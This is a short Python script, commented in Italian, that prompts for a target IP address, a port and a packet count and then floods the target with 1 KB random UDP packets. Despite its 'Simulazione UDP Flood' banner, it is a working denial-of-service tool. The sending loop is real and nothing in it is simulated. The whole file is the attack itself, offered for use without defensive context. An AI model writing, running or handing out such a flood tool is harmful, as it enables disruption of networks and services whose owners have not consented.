import ipaddress
import random
import socket

def valida_input(richiesta, funzione_validazione, messaggio_errore):
    # Questa funzione chiede un input e lo valida finché l'utente non inserisce un valore corretto.
    while True:
        try:
            valore = input(richiesta)
            funzione_validazione(valore)
            return valore
        except (ValueError, ipaddress.AddressValueError):
            print(messaggio_errore)

def valida_ip(ip_str):
    # Controlla se la stringa è un indirizzo IP valido (IPv4 o IPv6).
    ipaddress.ip_address(ip_str)

def valida_porta(porta_str):
    # Controlla se la stringa è un numero di porta valido (da 1 a 65535).
    porta = int(porta_str)
    if not (1 <= porta <= 65535):
        raise ValueError

def valida_pacchetti(pacchetti_str):
    # Controlla se la stringa è un numero intero positivo.
    pacchetti = int(pacchetti_str)
    if pacchetti <= 0:
        raise ValueError

def inondazione_udp(ip_bersaglio, porta_bersaglio, numero_pacchetti):
    # Funzione principale che esegue l'attacco di tipo UDP Flood.
    socket_udp = None
    try:
        # Converte i valori in interi, essenziale per il modulo socket.
        porta_bersaglio = int(porta_bersaglio)
        numero_pacchetti = int(numero_pacchetti)
        
        # Crea il socket UDP per inviare i pacchetti.
        socket_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Genera il contenuto del pacchetto (1 KB di dati casuali).
        dati_casuali = random.randbytes(1024)
        
        # Avvisa l'utente che l'attacco sta per iniziare.
        print(f"\nInizio attacco su {ip_bersaglio}:{porta_bersaglio}...")
        
        # Invia i pacchetti uno alla volta.
        for _ in range(numero_pacchetti):
            socket_udp.sendto(dati_casuali, (ip_bersaglio, porta_bersaglio))
            
        # Messaggio di conferma a fine attacco.
        print(f"Attacco completato. Inviati {numero_pacchetti} pacchetti.")
    except Exception as e:
        # Gestisce eventuali errori che potrebbero verificarsi durante l'attacco.
        print(f"\nAttacco fallito. Errore: {e}")
    finally:
        # Chiude il socket in ogni caso per liberare le risorse.
        if socket_udp:
            socket_udp.close()

if __name__ == "__main__":
    # Blocco principale del programma.
    print("--- Simulazione UDP Flood ---")
    
    # Richiede l'IP del bersaglio e lo valida.
    ip_bersaglio = valida_input(
        "Inserisci l'IP: ",
        valida_ip,
        "IP non valido. Riprova."
    )
    
    # Richiede la porta e la valida.
    porta_bersaglio = valida_input(
        "Inserisci la porta (1-65535): ",
        valida_porta,
        "Porta non valida. Inserisci un numero tra 1 e 65535."
    )
    
    # Richiede il numero di pacchetti e lo valida.
    numero_pacchetti = valida_input(
        "Quanti pacchetti vuoi inviare?: ",
        valida_pacchetti,
        "Numero di pacchetti non valido. Inserisci un numero maggiore di 0."
    )
    
    # Avvia la simulazione con i dati forniti.
    inondazione_udp(ip_bersaglio, porta_bersaglio, numero_pacchetti)